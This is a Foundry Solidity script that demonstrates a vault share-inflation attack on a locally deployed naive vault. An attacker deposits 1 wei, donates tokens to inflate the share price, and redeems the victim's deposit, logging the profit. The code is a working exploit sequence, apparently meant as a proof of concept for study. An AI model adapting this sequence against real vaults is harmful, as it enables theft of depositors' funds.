// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "../src/IERC20.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {NaiveVault} from "../src/NaiveVault.sol";

/// Runs the inflation attack live against a fresh naive vault on the local
/// node. It broadcasts real transactions as the attacker (anvil account 0)
/// and the victim (anvil account 1), so you can watch it happen on chain.
///
///   forge script script/AttackLocal.s.sol --rpc-url http://127.0.0.1:8545 --broadcast
contract AttackLocal is Script {
    // anvil's well-known default keys (local only, never real funds)
    uint256 constant ATK_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant VIC_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    function run() external {
        address attacker = vm.addr(ATK_KEY);
        address victim = vm.addr(VIC_KEY);

        // attacker deploys the vault, mints itself funds, deposits 1 wei,
        // then donates 10,000 tokens to inflate the price
        vm.startBroadcast(ATK_KEY);
        MockERC20 token = new MockERC20();
        NaiveVault vault = new NaiveVault(IERC20(address(token)));
        token.mint(attacker, 10_000 ether + 1);
        token.approve(address(vault), type(uint256).max);
        uint256 atkShares = vault.deposit(1, attacker);
        token.transfer(address(vault), 10_000 ether); // the donation
        vm.stopBroadcast();

        // victim deposits 10,000 tokens
        vm.startBroadcast(VIC_KEY);
        token.mint(victim, 10_000 ether);
        token.approve(address(vault), type(uint256).max);
        uint256 vicShares = vault.deposit(10_000 ether, victim);
        vm.stopBroadcast();

        // attacker redeems their single position and walks
        vm.startBroadcast(ATK_KEY);
        uint256 got = vault.redeem(atkShares, attacker, attacker);
        vm.stopBroadcast();

        console2.log("--- inflation attack on localhost (naive vault) ---");
        console2.log("attacker shares from 1 wei :", atkShares);
        console2.log("victim shares for 10000e18 :", vicShares);
        console2.log("attacker spent (1 + 10000e18):", uint256(10_000 ether + 1));
        console2.log("attacker got back          :", got);
        console2.log("attacker net profit        :", got - (10_000 ether + 1));
        console2.log("victim token balance left  :", token.balanceOf(victim));
        console2.log("victim redeemable now      :", vault.convertToAssets(vicShares));
    }
}
